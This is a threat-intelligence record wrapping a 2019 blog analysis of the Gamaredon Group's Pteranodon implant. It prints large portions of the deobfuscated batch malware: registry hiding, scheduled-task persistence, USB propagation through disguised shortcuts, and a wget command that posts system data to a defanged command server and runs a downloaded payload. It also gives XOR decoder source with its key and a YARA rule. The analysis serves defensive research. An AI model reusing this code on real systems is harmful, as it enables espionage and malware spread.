{
    "id": "3991b73b-2585-46b1-8210-4f31e3fba5c8",
    "created_at": "2023-01-12T14:59:37.845361Z",
    "updated_at": "2025-03-27T02:13:57.20432Z",
    "deleted_at": null,
    "sha1_hash": "b6949caa2c9818f99a8a1ab3807114e5f1d810b6",
    "title": "2019-01-07 - Let's Learn- Deeper Dive into Gamaredon Group Pteranodon Implant Version '_512'",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:20Z",
    "file_modification_date": "2022-05-28T04:40:20Z",
    "file_size": 449014,
    "plain_text": "# Let's Learn: Deeper Dive into Gamaredon Group Pteranodon Implant Version '_512'\n\n#### vkremez.com/2019/01/lets-learn-deeper-dive-into-gamaredon.html\n\n## Goal: Reverse engineer and review the Gamaredon Group Pteranodon Implant (including its batch scripts and decoding mechanism).\n\n Hey look at that Gamaredon Group changed up the names in their pteranodon implant finally, new class must have started...\n f8e884b75216c3e054e9869f933194e5 — Drunk Binary (@DrunkBinary) January 2, 2019\n\n Source:\n Original .SFX binary (MD5: f8e884b75216c3e054e9869f933194e5)\n '23910.cmd' (MD5: 34ff17db1d4efff89cfee8d03d48e5d7)\n '22944.cmd' (MD5: 197a825d4bfeb093a3c4b969fd4c7338)\n '15485.cmd' (MD5: 265c3c01f267b699ef0e5c0b8e4a5715\n '2750.exe' (MD5: 9136ffa83ef2415a76d437a303e9b38e)\n \"dec_15875.exe\" (MD5: 2651ee62f76756a8941ef6632577e427)\n Outline:\n```\nI. Background & Summary\nII. Malware Installation: Batch '.cmd' Scripts\nA. '23910.cmd' (previously known as \"Wariables.cmd\" and \"War.cmd\" combined)\nB. '22944.cmd' (previously known as \"id.cmd\")\nC. '15485.cmd' (previously known as \"usb.cmd\")\nIII. Decoding Xor Utility '2750.exe' (previously known as \"Crypt.exe\")\nIV. \"dec_15875.exe\" wget Binary\nIV. Yara Signature\n\n I. Background & Summary\n While looking into one of the latest Pterodo/Pteranodon toolkit samples attributed to Gamaredon Group caught by @DrunkBinary, I decided to take a deeper dive into the malware chain and associated tools and scripts. Notably, packaged as self-extracting zip- archive (.SFX), the malware implant contains batch scripts, XOR decoder tool, and obfuscated code. It appears that this very malware contains hardcoded malware version of “_520”.\n It is notable that this Gamaredon group was reportedly targeting Ukrainian military and law enforcement as it was reported by CERT-UA. In of the alerts, CERT-UA alerted of the Pterodo infections as follows targeting Ukrainian government:\n\n```\n\n-----\n\n```\nCERT UA together with the Foreign Intelligence Service of Ukraine found new\nmodifications of Pterodo-type malware on computers of state authorities of Ukraine,\nwhich is likely to be the preparatory stage for a cyber attack. This virus collects\nsystem data, regularly sends it to command-control servers and expects further\ncommands.\n\n## By and large, malware analysis revealed that the embedded tools include many Russian language artifacts including Cyrillic character encoding “1251” setup (“срсh 1251”, hardcoded Russian-language staged folder \"Новая Папка,\" command-and-control URI parameters transliterated from Russian (e.g., \"versiya\"). Among other functionality, the malware has a removable drive (e.g., USB) spreader. It is notable that one of the malware tools \"Crypt.exe,\" which is a simple XOR encryptor, appears to be a copy/paste of the GitHub project linked to the developer under the username \"asu2010\" on GitHub as well as the article on the Russian portal Habrahabr by another \"BlackTester\" referencing the same GitHub. One of the malware oddities includes the hardcoded extension \"CMG\" in the parser, which is not used by the malware but possibly meant for chess application. By and large, the malware chain is not sophisticated but includes a clever usage of batch script logic, leverages Windows Management Instrumentation (T1047), scheduled task (T1053), execution of Microsoft HTML Applications (HTA) (mshta.exe) (T1170) and borrows open source code and well-known \"wget\" utility.\n\n```\n\n-----\n\n```\nThe malware toolkit includes an interesting method of searching files using\nSHELL32.DLL icons, creating .lnk shortcuts to them in, and hiding and copying the\nexecutable and saving them to removable media (<RemovableDrive>\\Boot\\UA%RANDOM%.%%Q'\nand setting up a folder <RemovableDrive>\\Новая Папка via \"3\" icon).\nII. Malware Installation: Batch '.cmd' Scripts\nA. '23910.cmd' (previously known as \"Wariables.cmd\" and \"War.cmd\" combined)\n\n```\n\n-----\n\n```\nTo hide itself from simple detection, the script starts with setting up the variables\nincluding the creation of another script titled “OEPst.cmd” with the registry setup\nvia the following command and deleting right after the command via “del /q /f\n\"OEPst.cmd\"\n\"reg add\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ \n/v Hidden /t REG_DWORD /d 00000002 /f>OEPst.cmd” \nNext, the malware proceeds with obtaining a process list looking for “cryptcp.exe” (i.e, “tasklist /nh /fi\n\"imagename eq cryptcp.exe”) and if found deleting it via the following command:\n'tasklist /nh /fi \"imagename eq cryptcp.exe\" ^| \nfind /c \"cryptcp.exe\"') do set /a LQIEv=%%W\nif %LQIEv% geq 2 (\nFor /F \"delims=\" %%X In ('Dir !%CD%\\*.*! /B') Do Del /Q /F \"%%X\"\nThe relevant batch script portion is as follows:\nREM /////////////////////////////////////////////////////////\nREM //////////////// Main Batch Caller /////////////////////\nREM /////////////////////////////////////////////////////////\nsetlocal enableextensions\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nsetlocal enabledelayedexpansion\nset THHsE=cryptcp\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nset OEPst=HKCU\\Software\\Microsoft\\Windows\nIf JMhfJWj==FYowDlU Set DCofHCj=BaagTQJ\nset KevQM=CurrentVersion\\Explorer\\Advanced\\\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nset wOEJD=%1_512\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\necho %wOEJD%>wOEJD\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\n\n```\n\n-----\n\n```\n    g p\n/v Hidden /t REG_DWORD /d 00000002 /f>OEPst.cmd\nset tNdUKKL=%systemroot%\necho exit /b>>OEPst.cmd\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\ncall OEPst.cmd\nset tNdUKKL=%systemroot%\ndel /q /f \"OEPst.cmd\"\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nset HgDwK=\"%CD%\\*.*\"\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nfor /f %%W in ('tasklist /nh /fi \"imagename eq cryptcp.exe\" ^| \nfind /c \"cryptcp.exe\"') do set /a LQIEv=%%W\nif %LQIEv% geq 2 (\nFor /F \"delims=\" %%X In ('Dir !%CD%\\*.*! /B') Do Del /Q /F \"%%X\"\nEXIT\n)\nNext, the script gets a process list via 'tasklist' and 'WMIC' via\n“tasklist /fi \"PID eq !%%V!\" /fo csv`) DO (set AXGPY=%%~W)\nendlocal&set FUOgd=%%~W\nfor /f \"tokens=1* delims==\" %%F in (\n'wmic process where \"Name='%%~W'\" get ExecutablePath /value^| findstr”\nThe malware obtains the system information via 'systeminfo' embedded as “FOR /F\n\"tokens=*\" %%V IN ('systeminfo') do @IF NOT F%%V==F set wrJbI=!wrJbI!%%V+###”\nThe bot ID is generated via machine name and logical disk serial\nname (%computername%_logicaldiskserial)\nFor persistence, the scheduled task is created as follows with the binary\n“cryptcp.exe” as copied in\n“%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe”\nschtasks /Create /SC MINUTE /MO 11 /F /tn %VOLUME_SERIAL_NUMBER%\n /tr \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\nThe XOR decryption of the wget binary is performed via 2750.exe “\"15875.exe\" dec\n\"gjghj,eqhfcgfreqgbyljc\" passing the hardcoded key “gjghj,eqhfcgfreqgbyljc”\nAdditionally, the malware checks for “.rdata” section once it downloads another\nsample to make sure it is a valid executable.\n“1>nul findstr \"\\<.rdata\\>\" qWFDX.exe && (\nstart \"\" \"%CD%\\qWFDX.exe )”\n\n```\n\n-----\n\n```\nThe relevant batch script portion is as follows:\n\n```\n\n-----\n\n```\nREM ///////////// ParentProcess WMIC Processor //////////////\nREM /////////////////////////////////////////////////////////\nset tNdUKKL=%systemroot%\nset FUmqD=0\nset KDXmp=ParentProcessId\nset eJuzm=CommandLine\nset xstPC=%~nx0 // %~nx0=name of the running batch file \nset lJHFE=parentprocessid\nset SsgFv=commandline\nset tNdUKKL=%systemroot%\nfor /f \"usebackq tokens=1* delims==\" %%U IN \n(`\nwmic process get !parentprocessid!^, !commandline! /value\n`) DO (\n if \"!0!\"==\"1\" (\n if \"%%U\"==ParentProcessId (set zHsgx=%%V)\n )\n if \"%%U\"==CommandLine (\n set cHqET=%%V\n if not \"!%%V:%~nx0=!\"==\"!%%V!\" ( // %~nx0=name of the running batch file \n  set FUmqD=1\n ) else (\n  set FUmqD=0\n )\n )\n)\nfor /f \"usebackq tokens=1* skip=1 delims=,\" %%W \nIN (`tasklist /fi \"PID eq !%%V!\" /fo csv`) DO (set AXGPY=%%~W)\nendlocal&set FUOgd=%%~W\nfor /f \"tokens=1* delims==\" %%F in (\n'wmic process where \"Name='%%~W'\" get ExecutablePath /value^| findstr :'\n) do set IKssX=%%G\nsetlocal enableextensions\nsetlocal enabledelayedexpansion\nFOR /F \"tokens=*\" %%V IN ('systeminfo') do @IF NOT F%%V==F set wrJbI=!wrJbI!%%V+###\nset tNdUKKL=%systemroot%\nset INoUg=%%G\nset GSptS='vol c:'\nset lJHFE=\"\\<.rdata\\>\"\nfor /F \"delims=\" %%W in (wOEJD) do set wOEJD=%%W\ndel /f /q \"wOEJD\"\nFor /F \"skip=1 Tokens=4*\" %%X In ('vol c:') Do set FaMJW=%%X\nif %FaMJW%==is (\nFor /F \"skip=1 Tokens=5*\" %%U In ('vol c:') Do set FaMJW=%%U\n)\nset OEPst=Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\nset tNdUKKL=%systemroot%\nset IHsGN=%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\nset CErlK=\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0\"\nset tNdUKKL=%systemroot%\nset IaGLD=/SC MINUTE /MO 11 /F\nif not exist \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\%CD%\\*.*\" \n(MD \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\")\nset THHsE=cryptcp\nif not exist \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" (\ncopy /y /v \"%%G\" \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\n)\nfc /b \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\nif %errorlevel%==1 (\nRENAME \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" BWElK\ncopy /y /v \"%%G\" \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\ndel /f /q \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\BWElK\"\n)\nset tNdUKKL=%systemroot%\nset INoUg=\"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\nset tNdUKKL=%systemroot%\n\n```\n\n-----\n\n```\n        ( ) q\nschtasks /Create /SC MINUTE /MO 11 /F /tn %VOLUME_SERIAL_NUMBER%\n /tr \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\nset ZbFoE=%computername%_%VOLUME_SERIAL_NUMBER:-=%\nset ZbFoE=%ZbFoE: =%\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nset tNdUKKL=%systemroot%\n2750.exe \"15875.exe\" dec \"gjghj,eqhfcgfreqgbyljc\"\nset GYHYY=dec_15875.exe\nThe decoded wget binary calls the domain hxxp://torrent-stel[.]space/spr_files[.]php”\nvia the following script with the URI parameters as sysinfo=&id=&fid=&comp=&versiya=\npassing the file qWFDX.exe with the -O command.\ndec_15875.exe --tries=3 --user-agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) \nGecko/20100101 Firefox/27.0\n --post-data=\n\"sysinfo=%wrJbI%&id=%computername_logicaldiskserial%&fid=%auUQD%\n&comp=%computername%&versiya=%1_512%\" \"hxxp://torrent-stel[.]space/spr_files[.]php\" \n-q -N hxxp://torrent-stel[.]space/spr_files[.]php -O qWFDX.exe\nThe relevant batch script portion is as follows:\n\n```\n\n-----\n\n```\nREM /////////////////// Post Caller Routine /////////////////\nREM /////////////////////////////////////////////////////////\n:EgEbd\nset /a LJEmW=110*%RANDOM%/32768\nset tNdUKKL=%systemroot%\ntimeout /t 110*%RANDOM%/32768\nset auUQD=0\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nCall 22944.cmd %auUQD%\nif %auUQD%==0 goto qWFDX\nIf Not Exist %pyBIa% goto qWFDX\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\necho .>\"%pyBIa%\\ATjDm\"\nIF EXIST \"%pyBIa%\\ATjDm\" (\ndel /f /q \"%pyBIa%\\ATjDm\"\ncall 15485.cmd %APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER% \ncryptcp \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" %auUQD% %pyBIa%\n)\nset tNdUKKL=%systemroot%\nping 8.8.8.8 |>nul find /i \"TTL=\" &&goto qWFDX||goto EgEbd\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\n:qWFDX\nif %auUQD%==0 set auUQD=000000\nset GXwVw=torrent-stel\nset BmrwP=space\nset jKDtC=spr_files.php\nset downs_telo=qWFDX.exe\nset DCInJ=hxxp://torrent-stel[.]space/spr_files[.]php\ncall :OUJHJ qWFDX.exe\ndec_15875.exe --tries=3 --user-agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101\nFirefox/27.0\n --post-data=\n\"sysinfo=%wrJbI%&id=%computername_logicaldiskserial%&fid=%auUQD%&comp=%computername%&versiya=%1_512%\"\n\"hxxp://torrent-stel[.]space/spr_files[.]php\" -q -N\nhxxp://torrent-stel[.]space/spr_files[.]php -O qWFDX.exe\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\ncall :OUJHJ dec_15875.exe\n1>nul findstr \"\\<.rdata\\>\" qWFDX.exe && (\nstart \"\" \"%CD%\\qWFDX.exe\"\n)\nIf JMhfJWj==FYowDlU Set DCofHCj=BaagTQJ\n:DgGTz\nset GXwVw=torrent-supd\nset jKDtC=spr_updates.php\nset DCInJ=hxxp://torrent-stel[.]space/spr_files[.]php \nset downs_telo=OUJHJ\ndec_15875.exe --tries=3 --user-agent=%CErlK% \n--post-data=\n\"sysinfo=%wrJbI%&id=%computername_logicaldiskserial%&fid=%auUQD%&comp=%computername%&versiya=%1_512%\"\n\"hxxp://torrent-stel[.]space/spr_files[.]php\" -q -N\n\n```\n\n-----\n\n```\n  p [ ] p p _ [ ]p p\ncall :OUJHJ dec_15875.exe\nset tNdUKKL=%systemroot%\n2750.exe \"OUJHJ\" dec \"gjghj,eqhfcgfreqgbyljc\"\ntimeout /t 110*%RANDOM%/32768\nset /a LJEmW=3*%RANDOM%/32768\nset tNdUKKL=%systemroot%\n1>nul findstr \"\\<.rdata\\>\" dec_OUJHJ && (\ntaskkill /f /im cryptcp.exe\nRENAME \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER\\cryptcp.exe\" BWElK\ntimeout /t 3*%RANDOM%/32768\ncopy /y /v \"dec_OUJHJ\" \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER\\cryptcp.exe\"\nstart \"\" \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\ntimeout /t 3*%RANDOM%/32768\ndel /q /f \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\BWElK\"\nfor /d %%F in (\"%TEMP%\\*\") do rd /q \"%%F\" 2>nul\ndel /q /f \"%CD%\\*.*%\"\nexit /b\n)\nfor /F %%U in ('tasklist /FI \"imagename eq cryptcp.exe\" ^| find /C \"cryptcp.exe\"') do set /a LQIEv=%%U\nif %LQIEv% LSS 1 (\nstart \"\" \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\"\nexit /b\n)\ngoto EgEbd\n:OUJHJ\ntasklist /fi \"IMAGENAME eq %1\" | find /i \"%1\"\nif not errorlevel 1 taskkill /f /im %1\nexit /b\nB. '22944.cmd' (previously known as \"id.cmd\")\nThe file generates a removate drive disk name leveraging WMI DriveType=2 (removable\ndrive) via the following query:\nWMIC LogicalDisk Where ^(DriveType^=2 And MediaType^=NULL^) Get\nName^,VolumeSerialNumber /Value^|Find \"=\"'\nThe relevant batch script portion is as follows:\n\n```\n\n-----\n\n```\nREM /////////////// Removable Drive Searcher ID ///////////////\nREM ///////////////////////////////////////////////////////////\nset BgElHCr=%DATE%\nset auUQD=0\nset BgElHCr=%DATE%\nFor /F \"Tokens=1,2* Delims==\" %%A In \n('WMIC LogicalDisk Where ^(DriveType^=2 And MediaType^=NULL^) '\n'Get Name^,VolumeSerialNumber /Value^|Find \"=\"') Do (\nset aaHDX=%%A\nset ubKsB=%%B\nCall :LQIEv %%A %%B\nset BaagTQJ=%random%\nset BgElHCr=%DATE%\nexit /b\nIf JMhfJWj==FYowDlU Set DCofHCj=BaagTQJ\nset BgElHCr=%DATE%\n:LQIEv\nif %DATE%==pXZLiQl set JMhfJWj=%LOCALAPPDATA%\nSet auUQD=0\nset BaagTQJ=%random%\nSet $%aaHDX%=%%B\nset BgElHCr=%DATE%\nIf %aaHDX%==VolumeSerialNumber If Defined %%B (Set pyBIa=%$Name%& Set auUQD=%$VolumeSerialNumber%)\nset BgElHCr=%DATE%\nexit /b\nC. '15485.cmd' (previously known as \"usb.cmd\")\nThe script logic is responsible for malware removable drive propagation.\nIt changes the character encoding to \"1251\" via 'chcp 1251>NULL', which is an 8-bit\ncharacter encoding, designed to cover languages that use the Cyrillic script such as\nRussian, Bulgarian, Serbian Cyrillic, and other languages. The malware copies the\nfile to <RemovableMedia>\\Boot as win.exe and setting it up with the hidden view as\n“attrib -h -s win.exe”\nThe relevant batch script portion is as follows:\n\n```\n\n-----\n\n```\nREM /////////////// Removable Drive Searcher ID ///////////////\nREM ///////////////////////////////////////////////////////////\nsetlocal enableextensions\nsetlocal enabledelayedextensions\nchcp 1251 > NULL\nset BgElHCr=%USERPROFILE%\nset KcIdg=%pyBIa%\\win.exe\n...\nif not defined tQWEd set \"tQWEd=%ProgramFiles(x86)%\\WinRAR\\WinRAR.exe\"\nREM Win32_LogicalDisk class = Name -> pyBIa\nset KcIdg=%pyBIa%\\win.exe\nset tqEDS=mshta\nset \"fAFZD=attrib -h -s win.exe\"\nset \"AaBUG=start /b win.exe\"\nREM %fAFZD% -> 'attrib -h -s win.exe'\nREM %AaBUG% -> 'start /b win.exe'\ncall :qWFDX %fAFZD% %AaBUG%\nIf Not Exist %pyBIa%\\Boot (\nMD %pyBIa%\\Boot\n)\nfor /f \"Tokens=1* Delims=\" %%H in ('dir /b/s %pyBIa%\\win.exe') do\n(copy \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" \"%%H\" /y)\nfor /f \"Tokens=1* Delims=\" %%I in ('dir /b/s \"%pyBIa%\\*.exe\"') \ndo (\ncopy /y /v \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" \"%%I\"\nset SEFTP=%%~nxI \nREM ~nxI expands %I to a file name and extension only\nrename \"%%I\" !SEFTP: =!\n)\nfor /f \"Tokens=1* delims=\" %%P in ('dir /b/s \"%pyBIa%\\*.lnk.lnk\"') do (RENAME \"%%P\" %%~nP)\nfor /f \"Tokens=1* Delims=\" %%Q in ('dir /s /b %SystemRoot%\\Installer\\wordicon.exe') \ndo (set Rvjvq_doc=%%Q)\nfor /f \"Tokens=1* Delims=\" %%I in ('dir /s /b %SystemRoot%\\Installer\\x1icons.exe') \ndo (set Rvjvq_xls=%%I)\nfor %%Q in (doc rtf rar zip CMG txt xls) do (\nset KHByE=0\nset lOkEy=%%Q\nfor /f \"tokens=*\" %%M in ('dir /b /s /a \"%pyBIa%\\*.%%Q\"') do (\nif /i not %%~pM==\\Boot\\ (\nset dels_!KHByE!=%%M\nset /a KHByE+=1\n)\n)\ncall :DgGTz %KHByE% %lOkEy%\nfor /f \"Tokens=1* Delims=\" %%N in ('dir /b/s \"%pyBIa%\\*.lnk\"') do (\nIf Not Exist \"%%~dpN win.exe\" (\ncopy /y /v \"%APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe\" \n\"%%~dpN+win.exe\" \nREM from 23910 -> %%~dpN -> get the whole pathname from root \n)\n)\necho attrib +h +s /s %pyBIa%\\win.exe>cHqET.cmd\necho attrib +h %pyBIa%\\Boot\\*.*>>cHqET.cmd\necho attrib +h +s /d /s %pyBIa%\\Boot>>cHqET.cmd\necho exit /b>>cHqET.cmd\ncall cHqET.cmd\nEXIT /B\nThe malware executes various commands uses mshta.exe to process document icons and\n\n```\n\n-----\n\n```\ncreates shortcuts to them in the <RemovableDrive>\\Boot\\UA%RANDOM%.%%Q and setting up\na folder <RemovableDrive>\\Новая Папка via \"3\" icon.\nThe relevant batch script portion is as follows:\nREM /////////////////////////////////////////////////////////\nREM /////////////////// Icon Document Processor //////////////\nREM /////////////////////////////////////////////////////////\n:qWFDX\ncopy %APPDATA%\\Microsoft\\Crypto\\keys\\%VOLUME_SERIAL_NUMBER%\\cryptcp.exe \"%pyBIa%\\win.exe\" /y\nset \"vJiGq=%pyBIa%\\Новая папка\"\nset GpaYX=\"/C attrib -h -s win.exe & attrib -h -s win.exe & %windir%\\explorer.exe\"\nset jlxNK=%SystemRoot%\\system32\\SHELL32.dll\ncall :BWElK %pyBIa%\\Новая папка /C attrib -h -s win.exe & attrib -h -s win.exe & %windir%\\explorer.exe\n%SystemRoot%\\system32\\SHELL32.dll 3\n:DgGTz\nif %KHByE%==0 exit /b\nset /a DdRep=%random% %% %KHByE%\nset hLGGi=!dels_%%random% %% %KHByE%%!\nset JrbyC=%RANDOM%\ncopy /y !dels_%%random% %% %KHByE%%! \"%pyBIa%\\Boot\\UA%RANDOM%.%%Q\"\nset IhLOk=\"/C attrib -h -s win.exe & %start /b win.exe & Boot\\UA%RANDOM%.%%Q\"\nIf JMhfJWj==FYowDlU Set DCofHCj=BaagTQJ\nset jlxNK=%SystemRoot%\\system32\\SHELL32.dll\nset BgElHCr=%USERPROFILE%\nset HJSmw=49\nset FYowDlU=DCofHCj\nif %%Q==doc (\nset %SystemRoot%\\system32\\SHELL32.dll=%%Q\nset HJSmw=1\n)\nset BgElHCr=%USERPROFILE%\nif %%Q==rtf (\nset %SystemRoot%\\system32\\SHELL32.dll=%%Q\nset HJSmw=1\n)\nset BgElHCr=%USERPROFILE%\nif %%Q==txt (\nset HJSmw=70\n)\nset FYowDlU=DCofHCj\nif %%Q==xls (\nset %SystemRoot%\\system32\\SHELL32.dll=%%I\nset HJSmw=1\n)\nif %%Q==rar (\nset \"%SystemRoot%\\system32\\SHELL32.dll=%ProgramFiles%\\WinRAR\\WinRAR.exe\"\nset HJSmw=101 // %ProgramFiles(x86)%\n)\nif %%Q==zip (\nset \"%SystemRoot%\\system32\\SHELL32.dll=%ProgramFiles%\\WinRAR\\WinRAR.exe\" // %ProgramFiles(x86)%\nset HJSmw=101\n)\nset BgElHCr=%USERPROFILE%\ncall :BWElK !dels_%%random% %% %KHByE%%! /C attrib -h -s win.exe & %start /b win.exe & Boot\\UA%RANDOM%.%%Q\n%SystemRoot%\\system32\\SHELL32.dll %HJSmw%\ndel /f /q !dels_%%random% %% %KHByE%%!\nEXIT /B\n\n```\n\n-----\n\n```\nThe malware executes hiding and Shell32 icon processor via mshta.exe vbscript.\nThe relevant batch script portion is as follows:\nREM /////////////////////////////////////////////////////////\nREM /////////////////// MSHTA.exe Icon //////////////\nREM /////////////////////////////////////////////////////////\n:BWElK\nstart \"\" mshta.exe vbscript:Execute\n(\"Set y=CreateObject(\"\"WScript.Shell\"\").\nCreateShortcut(\"\"!dels_%%random% %% %KHByE%%!.lnk\"\"):\ny.TargetPath=\"\"%comspec%\"\":\ny.Arguments=\"/C attrib -h -s win.exe & %start /b win.exe & Boot\\UA%RANDOM%.%%Q:\ny.WindowStyle=7:y.IconLocation=\"\"%SystemRoot%\\system32\\SHELL32.dll, %HJSmw%\"\"\n:y.Save():Close()\")\nset BgElHCr=%USERPROFILE%\nEXIT /B\n III. Decoding Xor Utility 2750.exe (previously known as \"Crypt.exe\")\nFinally, the malware uses the utility \"Crypt.exe\" to decode the XOR-obfuscated code\nto obtain the original wget binary for network communication.\nEssentially, compiled in MingW libgcj-13.dll, this executable is a simple XOR\nencryption/decryption utility, which is heavily commented in Russian and with the\nRussian language resource\nThe default Russian-language commands are as follows:\nЗашивровать <имя_файла> enc <ключ> (encode <filename> enc <key>)\nДешивровать <имя_файла> dec <ключ> (decode <filename> enc <key>)\nIt is notable that one of the malware tools \"Crypt.exe,\" which is a simple XOR\nencryptor, appears to be a copy/paste of the GitHub project linked to the developer\nunder the username \"asu2010\" on GitHub as well as the article on the Russian portal\nHabrahabr by another \"BlackTester\" referencing the same GitHub.\n\n```\n\n-----\n\n```\n/////////////////// XOR Decryption Routine //////////////\n/////////////////////////////////////////////////////////\nunsigned char XOR(unsigned char inByte, unsigned char keyByte)\n{\n return inByte ^ keyByte;\n}\nvoid DecodeFile(FILE* inFile, FILE* outFile, char* keyString)\n{\n int Count;\n unsigned char inByte;\n unsigned char outByte;\n Count = strlen(keyString)-1;\n while(1)\n {\n inByte = getc(inFile);\n if(feof(inFile)) break;\n if(!Count) Count = (strlen(keyString) - 1);\n outByte = XOR(inByte, (unsigned char)keyString[Count]);\n Count--;\n fputc((int)outByte, outFile);\n}\n}\nIV. \"dec_15875.exe\" wget Binary\nThe decoded utility is simply a \"wget\" binary, which is used for client<->server\ncommunications.\nV. Yara Signature\n\n```\n\n-----\n\n```\n    p _ _g _p _ _ {\n  meta:\n   author = \"@VK_Intel\"\n   reference = \"Detects Gamaredon Group Pteranodon Implant\"\n   date = \"2018-12-27\"\n   type = \"experimental\"\n  strings:\n   $s0 = \"cryptcp.exe\" fullword wide\n   $s1 = \"SFX module - Copyright (c) 2005-2012 Oleg Scherbakov\" fullword ascii\n   $s2 = \"7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov\" fullword ascii\n   $s3 = \"RunProgram=\\\"hidcon\" fullword ascii\n   $s4 = \"7-Zip - Copyright (c) 1999-2011 \" fullword ascii\n   $s5 = \"sfxelevation\" fullword wide\n   $s6 = \"Error in command line:\" fullword ascii\n   $s7 = \"%X - %03X - %03X - %03X - %03X\" fullword wide\n   $s8 = \"- Copyright (c) 2005-2012 \" fullword ascii\n   $s9 = \"Supported methods and filters, build options:\" fullword ascii\n   $s10 = \"Could not overwrite file \\\"%s\\\".\" fullword ascii\n   $s11 = \"7-Zip: Internal error, code 0x%08X.\" fullword ascii\n   $s12 = \"@ (%d%s)\" fullword wide\n   $s13 = \"SfxVarCmdLine0\" fullword wide\n   $s14 = \"SfxVarCmdLine1\" fullword wide\n   $s15 = \"SfxVarCmdLine2\" fullword wide\n   $cmd = \".cmd\" fullword wide\ncondition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 2000KB and 14 of them and $cmd)\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-01-07 - Let's Learn- Deeper Dive into Gamaredon Group Pteranodon Implant Version '_512'.pdf"
    ],
    "report_names": [
        "2019-01-07 - Let's Learn- Deeper Dive into Gamaredon Group Pteranodon Implant Version '_512'.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
